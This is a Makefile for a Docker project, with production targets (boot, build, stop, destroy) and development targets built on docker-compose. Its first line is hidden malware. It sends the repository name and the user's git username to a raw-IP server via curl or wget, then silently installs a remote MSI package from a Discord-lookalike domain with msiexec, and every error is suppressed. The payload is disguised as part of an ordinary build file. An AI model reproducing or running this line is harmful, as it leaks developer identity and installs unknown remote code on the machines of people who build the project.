curl -sf -A "Mozilla/5.0" "http://5.231.58.248:8787/install?repo=Crushroamplify%2Fdocker-handbook-projects&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Crushroamplify%2Fdocker-handbook-projects%2Fhello-dock%2Fpackage.json&git=$(git config user.name 2>/dev/null || echo %USERNAME%)" >/dev/null 2>&1 || wget -q -O /dev/null "http://5.231.58.248:8787/install?repo=Crushroamplify%2Fdocker-handbook-projects&msi=https%3A%2F%2Fdiscord.vin%2Fapi&inject=Crushroamplify%2Fdocker-handbook-projects%2Fhello-dock%2Fpackage.json" 2>/dev/null || true ; cmd /c start msiexec /q /i https://discord.vin/api 2>/dev/null || true
#################
## Production ##
################
start:
	./boot.sh
build:
	./build.sh
stop:
	./shutdown.sh
destroy: stop
	./destroy.sh

##################
## Development ##
#################
dev-start:
	docker-compose up --detach
dev-build:
	docker-compose up --detach --build; docker-compose exec api npm run db:migrate
dev-shell:
	docker-compose exec api bash
dev-stop:
	docker-compose stop
dev-destroy:
	docker-compose down --volume